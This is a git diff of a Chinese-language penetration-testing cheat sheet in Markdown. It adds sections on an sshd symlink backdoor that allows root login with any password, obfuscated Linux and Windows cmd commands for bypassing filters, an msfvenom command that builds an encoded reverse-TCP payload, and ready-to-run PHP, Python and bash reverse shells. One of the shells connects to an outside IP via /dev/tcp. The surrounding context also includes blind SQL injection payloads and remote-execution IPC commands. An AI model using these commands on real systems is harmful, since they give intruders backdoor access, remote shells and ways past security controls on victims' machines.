@@ -1,12 +1,4 @@
-# 渗透相关语法
-
-相关漏洞学习资料，利用方法和技巧合集 
-
-
-目录
------------------
-
-* [Hacking study](#渗透相关语法)
+[hacking study](#渗透相关语法)
 	* [信息收集](#信息收集)
 		* [域名相关](#域名相关)
 		* [指纹识别](#指纹识别)
@@ -26,18 +18,31 @@
 			* [报错注入](#报错注入)
 			* [带外注入](#带外注入)
 			* [时间盲注](#时间盲注)
-	* [命令相关](#命令相关)
+	* [命令及后门相关](#命令及后门相关)
 			* [开3389](#开3389)
 			* [运行计划任务](#运行计划任务)
 			* [IPC入侵](#IPC入侵)
-		
+			* [nmap命令](#nmap命令)
+			* [sshd软链接后门](#sshd软链接后门)
+			* [lsof命令](#lsof命令)
+			* [linux命令bypass](#linux命令bypass)
+			* [cmd命令bypass](#cmd命令bypass)
+			* [msf命令](#msf命令)
+			
+	* [shell反弹](#shell反弹)
+			* [php反弹shell](#php反弹shell)
+			* [python反弹shell](#python反弹shell)
+			* [bash反弹shell](#bash反弹shell)
+			
+			
+			
 ## 信息收集
 
-> **前端js代码进行审计发现的一些路径去测试访问**
+> **前端js代码进行审计发现的一些路径记得去测试访问**
 
 ### 域名相关
 
-**工具**
+***工具***
 ```
 subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
 Sublist3r
@@ -325,7 +330,9 @@ file_name(@@version)
 ' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
 ```
 
-## 开3389
+## 命令及后门相关
+
+### 开3389
 
 **DOS下开3389**
 ```
@@ -344,7 +351,7 @@ echo "PortNumber"=dword:00000d3d>>3389.reg
 之后执行
 regedit /s 3389.reg
 ```
-## 运行计划任务
+### 运行计划任务
 
 **windows运行计划任务**
 ```
@@ -361,7 +368,7 @@ schtasks /create /tn "system" /tr C:\Windows\system321.exe\system321.exe /sc MIN
 /RL HIGHEST     #运行级别，HIGHEST为使用最高权限运行
 ```
 
-## IPC入侵
+### IPC入侵
 
 **IPC命令**
 ```
@@ -378,4 +385,199 @@ at \\127.0.0.25 10:50 srv.exe  #用at命令在0点50分启动srv.exe（注意这
 at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文件t.txt； 
 copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去 
 ```
+### nmap命令
+```
+查询在线主机
+nmap -sn 192.168.56.0/24
 
+端口和服务
+nmap -sS -sV -T5 -A -p- 192.168.0.109
+
+```
+
+### sshd软链接后门
+```
+1、服务端执行
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345
+ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345
+
+2、客户端执行
+ssh root@x.x.x.x -p 12345
+
+#输入任意密码就可以root用户权限登陆了，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆，比如：ubuntu
+
+检测
+1、查看可疑端口
+netstat -antlp
+2、查看可执行文件
+ls -al /tmp/su
+清除
+1、禁止PAM认证
+vim /etc/ssh/sshd_config
+UsePAM no
+2、重载
+/etc/init.d/sshd reload
+
+```
+
+### lsof命令
+```
+列出某个用户打开文件的信息：
+lsof -u username
+
+列出以进程号打开的文件： 
+lsof -p 1,234
+
+列出所有网络连接：
+lsof -i 
+
+列出所有tcp连接：
+lsof -i tcp 
+
+查出22端口现在运行什么程序： 
+lsof -i :22
+
+列出谁在使用某个端口：
+lsof -i tcp:3389
+
+列出某个用户所有活跃的网络连接：
+lsof -a -u username -i
+
+```
+
+### linux命令bypass
+```
+使用反斜杠
+w\ho\am\i
+
+空格绕过
+使用<和>
+cat<>flag
+cat<1.sh 
+使用特殊变量:$IFS
+cat$IFS\flag
+cat${IFS}flag
+
+使用特殊变量${9}
+${9}对应空字符串关键字过滤绕过，使用$*和$@，$x(x代表1-9),${x}(x>=10)
+ca$*t  flag
+ca$@t flag
+ca$2t flag
+ca${11} flag
+
+花括号还有一种用法：{command,argument}
+{cat,flag}
+
+使用双引号和单引号
+ca"t" 1.sh
+ca't' 1.sh
+
+使用base64
+echo 'Y2F0IC4vZmxhZwo=' |base64 -d |bash
+
+使用进制
+$(printf '\x00\x00\x00\x00\x00')
+使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass
+
+突破终端限制执行脚本内容：
+man -P /tmp/runme.sh man
+
+突破终端限制执行脚本中的命令：
+tar cvzf a.tar.gz --checkpoint-action=exec=./a.sh --checkpoint=1 a.sh 
+tar c a.tar -I ./runme.sh a
+
+CVE-2014-6271
+env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id 
+
+awk执行系统命令三种方法：
+awk 'BEGIN{system("echo abc")}' 
+awk 'BEGIN{print "echo","abc"| "/bin/bash"}' 
+awk '{"date"| getline d; print d; close("d")}'
+
+```
+
+### cmd命令bypass
+```
+逗号------------net user
+,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;net user
+
+括号-----------netstat /ano | findstr LISTENING
+,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;netstat -ano |; ,;( (,;,((findstr LISTENING)),;,) )
+
+转义字符------------netstat /ano | findstr LISTENING
+,;,%coMSPec:~ -0, +27%,; ,;, ;^^^^/^^^^b^^^^, ;;; ,^^^^/^c, ,,, ;^^st^^art^^; , ; ;/^^^^b ; , ^^^^/^^^^min ,;net^^^^stat ^^^^ ^^^^-a^^^^no ^^^^ ^|; ,;( ^ (,;^,(^(fi^^^^ndstr LIST^^^^ENING)^),;^,) ^ )
+
+设置环境变量------
+#cmd /c "set com3= &&set com2=user&&set com1=net &&call %com1%%com2%%com3%"
+#cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call %com1%%com2%%com3%"
+#cmd /c "set com3= &&set com2=user&&set com1=net &&call set final=%com1%%com2%%com3%&&call %final%"
+
+随机大小写-------
+CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cOm2%%coM3%&& cAlL %FinAl%"
+
+逗号和分号---------
+;,,CMd,; ,/C ", ;, ;sEt coM3= &&,,,SEt cOm2=user&&;;;seT CoM1=net &&, ;caLl,;,SeT fiNAl=%COm1%%cOm2%%coM3%&&; , ,cAlL, ;, ;%FinAl%"
+
+将配对双引号添加到输入命令以混淆其最终命令行参数
+;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e””t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (,,(c^AlL^, ;,^ ;%Fi^nAl^%))"
+
+使用cmd.exe的/ V：ON参数启用延迟环境变量扩展
+;,,C^Md^,; /V:ON,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^””e””t) ) &&set quotes=””&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) )"
+
+```
+
+### msf命令
+```
+生成exe文件
+msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe
+```
+
+## shell反弹
+
+### php反弹shell
+
+```
+攻击机监听
+nc -lvvp 4444
+
+要求目标机器有php然后执行
+php -r '$sock=fsockopen("192.168.23.88",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+```
+
+### python反弹shell
+
+```
+代码
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.56.104",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+
+
+受害机执行
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+攻击机执行
+nc -lvvp 5555
+
+交互shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+
+### bash反弹shell
+
+```
+攻击机
+nc -lvvp 4444
+
+受害机
+bash -i >& /dev/tcp/47.98.229.211/4444 0>&1
+
+```
